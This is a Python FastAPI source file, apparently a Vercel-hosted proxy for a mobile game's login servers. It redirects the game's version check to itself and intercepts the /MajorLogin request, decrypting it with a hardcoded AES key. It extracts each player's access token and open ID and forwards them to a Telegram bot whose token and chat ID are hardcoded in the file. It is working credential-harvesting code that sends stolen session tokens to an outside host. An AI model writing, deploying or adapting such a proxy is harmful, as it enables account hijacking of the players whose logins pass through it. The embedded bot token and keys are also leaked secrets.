import os
import json
import sys
import traceback
import httpx
import requests
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, Response
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ========== IMPOR X7M DENGAN FALLBACK ==========
try:
    from x7m import decrypt_api, get_available_room
    print("[OK] x7m imported")
except Exception as e:
    print(f"[WARN] x7m import error: {e}, using fallback")
    def decrypt_api(hex_data):
        try:
            return bytes.fromhex(hex_data).decode('utf-8', errors='ignore')
        except:
            return hex_data
    def get_available_room(data):
        return data

app = FastAPI()

# ========== TOKEN & CHAT ID DITULIS LANGSUNG ==========
# (bisa diganti dengan env vars jika ingin lebih aman)
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8822285495:AAHLYHZDWqT6TspWuBGxYfZkxnnGl5furuw")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6513583182")

print(f"[INFO] Using TOKEN: {TOKEN[:5]}... CHAT_ID: {CHAT_ID}")

# ========== KONSTANTA AES ==========
Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'

def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(HeX, AES.block_size)).hex()

def DEc_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return unpad(cipher.decrypt(HeX), AES.block_size).hex()

# ========== ENDPOINT /ver.php ==========
@app.api_route("/ver.php", methods=["GET", "POST"])
async def manual(request: Request):
    try:
        target = "https://version.ggwhitehawk.com/live/ver.php"
        headers = {
            k: v for k, v in request.headers.items()
            if k.lower() not in ("host", "content-length", "connection")
        }
        async with httpx.AsyncClient(follow_redirects=True) as client:
            r = await client.request(
                request.method,
                target,
                params=dict(request.query_params),
                headers=headers,
                content=await request.body()
            )
        data = r.json()
        # Ganti dengan domain Vercel Anda (sesuaikan!)
        data["server_url"] = "https://proxy-cgu.vercel.app"

        HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate',
                      'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
        response_headers = {
            k: v for k, v in r.headers.items()
            if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding")
        }
        return JSONResponse(content=data, status_code=r.status_code, headers=response_headers)
    except Exception as e:
        print(f"[ERROR] /ver.php: {e}")
        traceback.print_exc()
        return JSONResponse(content={"error": str(e)}, status_code=500)

# ========== ENDPOINT /MajorLogin ==========
@app.api_route("/MajorLogin", methods=["POST"])
async def MajorLoginProxy(request: Request):
    try:
        print("[INFO] MajorLogin called")
        body = await request.body()
        if not body:
            return Response(content="Empty body", status_code=400)

        hex_data = body.hex()
        decrypted = decrypt_api(hex_data)
        room_data = get_available_room(decrypted)
        parsed = json.loads(room_data)
        acess_token = parsed.get("29", "")
        open_id = parsed.get("22", "")
        print(f"[INFO] Token: {acess_token}, OpenID: {open_id}")

        # Kirim ke Telegram (token & chat ID sudah hardcode)
        if acess_token and open_id:
            try:
                ff = f"""Access Token : {acess_token} .
Open_id : {open_id} .

By : CONVERTGAMINGUID
CGU PROXY."""
                r = requests.post(
                    f'https://api.telegram.org/bot{TOKEN}/sendMessage',
                    params={'chat_id': CHAT_ID, 'text': ff}
                )
                if r.status_code == 200:
                    print('[OK] Sent to Telegram')
                else:
                    print(f'[WARN] Telegram send failed: {r.status_code}')
            except Exception as e:
                print(f"[ERROR] Telegram: {e}")

        # Respons yang diharapkan game (status 500)
        nikomLhnoud = f""" [b][c][279CF5]














─────────────────────────────────────

[cccccc]access Token => [ff0000]{acess_token} [cccccc]| open id => [00ff00]{open_id}

[00ff00] CONVERTGAMINGUID




















                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    """
        return Response(content=nikomLhnoud, status_code=500, media_type="application/octet-stream")

    except json.JSONDecodeError as e:
        print(f"[ERROR] JSON decode: {e}")
        traceback.print_exc()
        return Response(content="{}", status_code=500, media_type="application/octet-stream")
    except Exception as e:
        print(f"[ERROR] MajorLogin: {e}")
        traceback.print_exc()
        return Response(content="{}", status_code=500, media_type="application/octet-stream")

# ========== UNTUK LOCAL TESTING ==========
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=6677)
